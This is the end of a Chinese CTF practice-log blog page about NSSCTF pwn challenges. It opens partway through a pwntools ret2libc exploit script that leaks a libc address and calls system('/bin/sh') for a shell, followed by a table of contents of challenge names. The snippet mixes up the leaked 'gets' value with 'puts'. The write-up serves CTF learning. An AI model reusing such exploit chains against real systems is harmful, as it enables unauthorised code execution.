flat([cyclic(offset),rdi,elf.got[<span class="string">&#x27;gets&#x27;</span>],elf.plt[<span class="string">&#x27;puts&#x27;</span>],<span class="number">0x4009A0</span>])</span><br><span class="line">sl(payload1)</span><br><span class="line">rl(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">rl(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">gets = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;gets: &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(gets))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = LibcSearcher(&#x27;puts&#x27;,puts)</span></span><br><span class="line"></span><br><span class="line">libc_base = puts - <span class="number">0x6f6a0</span></span><br><span class="line">system = <span class="number">0x453a0</span> + libc_base</span><br><span class="line">str_bin_sh = <span class="number">0x18ce57</span> + libc_base</span><br><span class="line">payload2 = flat([cyclic(offset),ret,rdi,str_bin_sh,system])</span><br><span class="line">sl(payload2)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/about/">关于</a></li>
        
          <li><a href="/search/">搜索</a></li>
        
          <li><a href="/archives/">归档</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">NSSCTF刷题记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#11-9"><span class="toc-number">1.1.</span> <span class="toc-text">11.9</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GDOUCTF-2023-%E7%9C%9F%E7%94%B7%E4%BA%BA%E4%B8%8B120%E5%B1%82"><span class="toc-number">1.1.1.</span> <span class="toc-text">[GDOUCTF 2023]真男人下120层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MoeCTF-2022-ret2text"><span class="toc-number">1.1.2.</span> <span class="toc-text">[MoeCTF 2022]ret2text</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NUSTCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ezPwn"><span class="toc-number">1.1.3.</span> <span class="toc-text">[NUSTCTF 2022 新生赛]ezPwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2023-%E5%88%9D%E8%B5%9B-%E7%83%A7%E7%83%A4%E6%91%8A%E5%84%BF"><span class="toc-number">1.1.4.</span> <span class="toc-text">[CISCN 2023 初赛]烧烤摊儿</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HDCTF-2023-KEEP-ON"><span class="toc-number">1.1.5.</span> <span class="toc-text">[HDCTF 2023]KEEP ON</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-Integer-Overflow"><span class="toc-number">1.1.6.</span> <span class="toc-text">[SWPUCTF 2022 新生赛]Integer Overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HNCTF-2022-Week1-ezcmp"><span class="toc-number">1.1.7.</span> <span class="toc-text">[HNCTF 2022 Week1]ezcmp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-fmt"><span class="toc-number">1.1.8.</span> <span class="toc-text">[HUBUCTF 2022 新生赛]fmt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HNCTF-2022-Week1-ezr0p64"><span class="toc-number">1.1.9.</span> <span class="toc-text">[HNCTF 2022 Week1]ezr0p64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-shellcode%EF%BC%9F"><span class="toc-number">1.1.10.</span> <span class="toc-text">[SWPUCTF 2022 新生赛]shellcode？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HNCTF-2022-WEEK2-ez-backdoor"><span class="toc-number">1.1.11.</span> <span class="toc-text">[HNCTF 2022 WEEK2]ez_backdoor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-singout"><span class="toc-number">1.1.12.</span> <span class="toc-text">[HUBUCTF 2022 新生赛]singout</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF-2023-%E7%8B%A0%E7%8B%A0%E7%9A%84%E6%BA%A2%E5%87%BA%E6%B6%85"><span class="toc-number">1.1.13.</span> <span class="toc-text">[LitCTF 2023]狠狠的溢出涅~</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HNCTF-2022-Week1-safe-shellcode"><span class="toc-number">1.1.14.</span> <span class="toc-text">[HNCTF 2022 Week1]safe_shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LitCTF-2023-%E5%8F%A3%E7%AE%97%E9%A2%98%E5%8D%A1"><span class="toc-number">1.1.15.</span> <span class="toc-text">[LitCTF 2023]口算题卡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HDCTF-2023-pwnner"><span class="toc-number">1.1.16.</span> <span class="toc-text">[HDCTF 2023]pwnner</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-10"><span class="toc-number">1.2.</span> <span class="toc-text">11.10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MoeCTF-2022-shell"><span class="toc-number">1.2.1.</span> <span class="toc-text">[MoeCTF 2022]shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HGAME-2023-week1-easy-overflow"><span class="toc-number">1.2.2.</span> <span class="toc-text">[HGAME 2023 week1]easy_overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-babystack"><span class="toc-number">1.2.3.</span> <span class="toc-text">[UUCTF 2022 新生赛]babystack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MoeCTF-2021-ret2text-ez"><span class="toc-number">1.2.4.</span> <span class="toc-text">[MoeCTF 2021]ret2text_ez</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MoeCTF-2022-babyfmt"><span class="toc-number">1.2.5.</span> <span class="toc-text">[MoeCTF 2022]babyfmt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-Darling"><span class="toc-number">1.2.6.</span> <span class="toc-text">[SWPUCTF 2022 新生赛]Darling</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-11"><span class="toc-number">1.3.</span> <span class="toc-text">11.11</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SDCTF-2022-Horoscope"><span class="toc-number">1.3.1.</span> <span class="toc-text">[SDCTF 2022]Horoscope</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NISACTF-2022-shop-pwn"><span class="toc-number">1.3.2.</span> <span class="toc-text">[NISACTF 2022]shop_pwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E4%B8%AD-PWN1"><span class="toc-number">1.3.3.</span> <span class="toc-text">[CISCN 2019华中]PWN1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF-2020-YDSneedGirlfriend"><span class="toc-number">1.3.4.</span> <span class="toc-text">[BJDCTF 2020]YDSneedGirlfriend</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2022-%E5%88%9D%E8%B5%9B-login-normal"><span class="toc-number">1.3.5.</span> <span class="toc-text">[CISCN 2022 初赛]login_normal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF-2020-babyrop2"><span class="toc-number">1.3.6.</span> <span class="toc-text">[BJDCTF 2020]babyrop2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2018-%E6%8B%9B%E6%96%B0%E8%B5%9B-basic-pwn"><span class="toc-number">1.3.7.</span> <span class="toc-text">[SUCTF 2018 招新赛]basic pwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HDCTF-2023-Minions"><span class="toc-number">1.3.8.</span> <span class="toc-text">[HDCTF 2023]Minions</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-12"><span class="toc-number">1.4.</span> <span class="toc-text">11.12</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HNCTF-2022-WEEK4-ezheap"><span class="toc-number">1.4.1.</span> <span class="toc-text">[HNCTF 2022 WEEK4]ezheap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GDOUCTF-2023-Random"><span class="toc-number">1.4.2.</span> <span class="toc-text">[GDOUCTF 2023]Random</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-13"><span class="toc-number">1.5.</span> <span class="toc-text">11.13</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-easystack"><span class="toc-number">1.5.1.</span> <span class="toc-text">[UUCTF 2022 新生赛]easystack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HDCTF-2023-Makewish"><span class="toc-number">1.5.2.</span> <span class="toc-text">[HDCTF 2023]Makewish</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2023-%E5%88%9D%E8%B5%9B-funcanary"><span class="toc-number">1.5.3.</span> <span class="toc-text">[CISCN 2023 初赛]funcanary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SWPUCTF-2023-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-%E7%AD%BE%E5%88%B0"><span class="toc-number">1.5.4.</span> <span class="toc-text">[SWPUCTF 2023 秋季新生赛]签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2019%E8%A5%BF%E5%8D%97-PWN1"><span class="toc-number">1.5.5.</span> <span class="toc-text">[CISCN 2019西南]PWN1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HGAME-2023-week1-simple-shellcode"><span class="toc-number">1.5.6.</span> <span class="toc-text">[HGAME 2023 week1]simple_shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HNCTF-2022-WEEK2-ret2libc"><span class="toc-number">1.5.7.</span> <span class="toc-text">[HNCTF 2022 WEEK2]ret2libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B-2022-jmp-rsp"><span class="toc-number">1.5.8.</span> <span class="toc-text">[广东省大学生攻防大赛 2022]jmp_rsp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NSSRound-4-SWPU-%E7%9C%9F%E7%AD%BE%E5%88%B0%E9%A2%98%E6%9D%A5%E8%AF%95%E8%AF%95%E5%90%A7"><span class="toc-number">1.5.9.</span> <span class="toc-text">[NSSRound#4 SWPU]真签到题来试试吧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2019%E5%8D%8E%E5%8D%97-PWN4"><span class="toc-number">1.5.10.</span> <span class="toc-text">[CISCN 2019华南]PWN4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-14"><span class="toc-number">1.6.</span> <span class="toc-text">11.14</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FSCTF-2023-rdi"><span class="toc-number">1.6.1.</span> <span class="toc-text">[FSCTF 2023]rdi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-FindanotherWay"><span class="toc-number">1.6.2.</span> <span class="toc-text">[SWPUCTF 2022 新生赛]FindanotherWay</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#watevrCTF-2019-Voting-Machine-2"><span class="toc-number">1.6.3.</span> <span class="toc-text">[watevrCTF 2019]Voting Machine 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HGAME-2023-week1-choose-the-seat"><span class="toc-number">1.6.4.</span> <span class="toc-text">[HGAME 2023 week1]choose_the_seat</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-15"><span class="toc-number">1.7.</span> <span class="toc-text">11.15</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SWPUCTF-2023-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-Shellcode"><span class="toc-number">1.7.1.</span> <span class="toc-text">[SWPUCTF 2023 秋季新生赛]Shellcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-16"><span class="toc-number">1.8.</span> <span class="toc-text">11.16</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NSSRound-9-Basic-MyExec"><span class="toc-number">1.8.1.</span> <span class="toc-text">[NSSRound#9 Basic]MyExec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MoeCTF-2022-ret2libc"><span class="toc-number">1.8.2.</span> <span class="toc-text">[MoeCTF 2022]ret2libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MoeCTF-2021-ezROP"><span class="toc-number">1.8.3.</span> <span class="toc-text">[MoeCTF 2021]ezROP</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/11/16/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/11/16/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/&text=NSSCTF刷题记录"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/11/16/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/&title=NSSCTF刷题记录"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/11/16/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/&is_video=false&description=NSSCTF刷题记录"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=NSSCTF刷题记录&body=Check out this article: http://example.com/2024/11/16/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/11/16/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/&title=NSSCTF刷题记录"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/11/16/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/&title=NSSCTF刷题记录"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/11/16/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/&title=NSSCTF刷题记录"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/11/16/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/&title=NSSCTF刷题记录"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/11/16/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/&name=NSSCTF刷题记录&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/11/16/NSSCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/&t=NSSCTF刷题记录"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <ul>
    
      <!-- 不蒜子统计 -->
      <span id="busuanzi_container_site_pv">
          本站总访问量<span id="busuanzi_value_site_pv"></span>次
      </span>
      <span class="post-meta-divider">|</span>
      <span id="busuanzi_container_site_uv" style='display:none'>
              本站访客数<span id="busuanzi_value_site_uv"></span>人
      </span>
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    
  </ul>
      <div class="footer-left">
        Copyright &copy;
        
        
        2024-2025
        N1ght
      </div>
      <div class="footer-right">
        <nav>
          <ul>
            <!--
          --><li><a href="/">首页</a></li><!--
        --><!--
          --><li><a href="/about/">关于</a></li><!--
        --><!--
          --><li><a href="/search/">搜索</a></li><!--
        --><!--
          --><li><a href="/archives/">归档</a></li><!--
        -->
          </ul>
        </nav>
      </div>
      
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?adec00eac37a4f07fb02d0f478140978";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
